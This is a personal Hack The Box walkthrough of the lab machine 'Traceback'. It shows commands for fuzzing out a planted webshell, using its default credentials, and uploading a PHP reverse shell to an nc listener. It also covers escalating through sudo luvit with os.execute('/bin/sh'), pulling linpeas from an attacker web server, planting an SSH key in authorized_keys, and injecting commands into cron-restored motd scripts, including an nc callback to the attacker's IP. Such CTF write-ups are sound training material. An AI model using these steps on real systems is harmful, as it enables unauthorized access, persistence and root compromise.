#HackTheBox
#Traceback

Let's attempt doing another HTB machine.

	
	kali@kali:~$ nmap -sV -T4 10.10.10.181
	Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 02:00 EDT
	Nmap scan report for 10.10.10.181
	Host is up (0.12s latency).
	Not shown: 998 closed ports
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

It looks like we've only got two open ports. The website seems to have been taken over. The site says: 

	
	This site has been owned
	I have left a backdoor for all the net. FREE INTERNETZZZ
	- Xh4H -

A comment on the code says 'Some of the best webshells you might need ;)'

I tried bruteforcing ssh, but that didn't do much. I googled the phrase on the comment and found a github repo with web shells.

	https://github.com/Xh4H/Web-Shells

Let's try fuzzing the website, maybe one of the shells is in the server.
	
	ffuf -w ../CTF/HTB/Machines/Traceback/webshells.txt -u http://10.10.10.181/FUZZ

	smevk.php               [Status: 200, Size: 1261, Words: 318, Lines: 59]

Gotcha!

If we go to http://10.10.10.181/smwvk.php we will get a login screen.

We have no creds. Let's check out the shell's source code for clues.

	//Make your setting here.
	$deface_url = 'http://pastebin.com/raw.php?i=FHfxsFGT';  //deface url here(pastebin).
	$UserName = "admin";                                      //Your UserName here.
	$auth_pass = "admin";                                  //Your Password.
	//Change Shell Theme here//
	$color = "#8B008B";                                   //Fonts color modify here.
	$Theme = '#8B008B';                                    //Change border-color accoriding to your choice.
	$TabsColor = '#0E5061';                              //Change tabs color here.
	#-------------------------------------------------------------------------------

It seems like the default user and password are admin. Let's try using those.

Aha! We're in.

I wanted to upload a reverse shell to the server to feel a bit more confortable. Let's set up a listener and request it with curl.

	Terminal 1:
	nc -lvnp 1234
	Terminal 2:
	curl 10.10.10.181/php-reverse-shell.phtml

We find a note on /home/webadmin/

	cat note.txt 
	- sysadmin -
	I have left a tool to practice Lua.
	I'm sure you know where to find it.
	Contact me if you have any question.

If we run sudo -l we get the following output:

	webadmin@traceback:/home$ sudo -l
	sudo -l
	Matching Defaults entries for webadmin on traceback:
	    env_reset, mail_badpass,
	    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User webadmin may run the following commands on traceback:
	    (sysadmin) NOPASSWD: /home/sysadmin/luvit
	webadmin@traceback:/home$ 

It seems like we can run the following command to run luvit as sysadmin:
	
	sudo -u sysadmin /home/sysadmin/luvit
	
I failed several attempts but I was on the correct path. All we have to do is make a lua executable and run it to get a shell with sudo privileges.

	#Create the privesc file.
	echo 'os.execute("/bin/sh")' > privesc.lua

	#Run
	sudo -u sysadmin /home/sysadmin/luvit privesc.lua

	#Get a proper shell.
	python3 -c 'import pty; pty.spawn("/bin/bash")'

The user flag is on the home folder.

Time to privesc. Let's use the linpeas script file.

We'll setup a webserver on the linpeas directory.

	python3 -m http.server 80 

On the the Traceback machine, let's do:
	
	wget <yourIP>/linpeas.sh

Make linpeas.sh executable and run it.

	chmod +x linpeas.sh
	./linpeas.sh

We might have found a privilege escalation vector.

	[+] Interesting GROUP writable files (not in Home) (max 500)
	[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
	  Group sysadmin:
	/etc/update-motd.d/50-motd-news --
	/etc/update-motd.d/10-help-text --
	/etc/update-motd.d/91-release-upgrade --
	/etc/update-motd.d/00-header --
	/etc/update-motd.d/80-esm --
	/home/webadmin/note.txt --

There seems to be a cron job running that uses these scripts.

	root      38116  0.0  0.0   4628   780 ?        Ss   17:11   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/

Okay, something I did not know. motd are scripts that wun everytime a user is logged in, which means that if I login through ssh the scripts on the update-motd.d directory will be executed. SSH is running on an open port 22. So that might be the way to go. 

After struggling for some time with this part I found out I had the right mindset but not the right knowledge.

A little earlier I found the .ssh folder on webadmin's home directory. I thought authorized_keys was a standard file and couldn't really use it for anything. I was wrong. I can copy my own public key and use it to connect to Traceback through ssh. I think this is some pretty basic ssh knowledge, and it totally went over my head.

All I need to do is insert my public key in the authorized_keys file.

	echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrq1BbyI20bfN5S0LRwtdh/0pGAmRMorkTsCDifn9k08ckgGUW8smTApjEQQ5vrxWXOhsDWZhfjEXCuVCPMC3Wp5IVNgaJOGqVwqh4bZhWkc5hgEKb4avFC3Wv8nKRQOIF+Z0y/vAXo4WgOVEwmKHihbbtzmAkWFQQGch+Z30lamzvY1tOkmsIuAEkLQ+1+aGXWQT/CAHbeRnA+c4qv9HJHoJb681WutEWO2Hh7y0+dPqxWE152eHifl5oMlI5gvg9ZLENfpHeLg4btJz+RDhIkuUSPJIy/Ad3X+KamM6HGph8kuhjN4DqXd3nB9DX+mQJyeqD03ZvmTuEIqPYuKvx1Y+aXSJPZ+/d8sshyWzK5jFvZ19jTZnD1g0/ymKgUSuZmo3mR8qBYTsJLrobUaZkLI8EIcec7LvxHO2ocfV8teRY0S0+OnZTSmAVRCr9mNlnZLioOU34YHAU4IskQgkfqY9htkcn1VcALizlmudYMAiej4l6P2uJhIfBTVIGgBU= kali@kali" >> /home/sysadmin/.ssh/authorized_keys

And with this I require no password to login.
So I guess that the following message means that either a publickey or a password is required to login.
	
	sysadmin@10.10.10.181: Permission denied (publickey,password).

Now, all I have to do is to modify any script on the update-motd.d directory to access the root flag and login through SSH. Remember the cron job we found earlier? It restores backups of the motd files every 30 seconds. So, we've got to overwrite these files and then login through ssh in less than 30 seconds. The uptime command comes in handy to know if the 30 seconds mark is near.

	echo "cat /root/root.txt" > 10-help-text

Oops, that didn't work. I think i have to append the command instead of overwriting the file.

	echo "cat /root/root.txt" >> 10-help-text

Let's try logging in through SSH.

	kali@kali:~$ ssh sysadmin@10.10.10.181 
	#################################
	-------- OWNED BY XH4H  ---------
	- I guess stuff could have been configured better ^^ -
	#################################

	Welcome to Xh4H land 

	xxxxxxxxxxxxROOTFLAGxxxxxxxxxxxx

	Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

	Last login: Fri Jul 31 19:52:12 2020 from 10.10.14.214
	$ 

There we go! We got the root flag.


Some other guy suggests a reverse shell is possible using the same method, which is something I was attempting to do like this: 

	echo "nc 10.10.14.214 4444" >> 10-help-text

That didn't work,though. I might have used the command the wrong way, or perhaps the box has a different nc version.

Read this mf.
https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/

#Commands to quickly login as sysadmin.

	python3 -c 'import pty; pty.spawn("/bin/bash")'
	cd /home/webadmin
	echo 'os.execute("/bin/sh")' > privesc.lua
	sudo -u sysadmin /home/sysadmin/luvit privesc.lua
	python3 -c 'import pty; pty.spawn("/bin/bash")'
	cd ../sysadmin
	id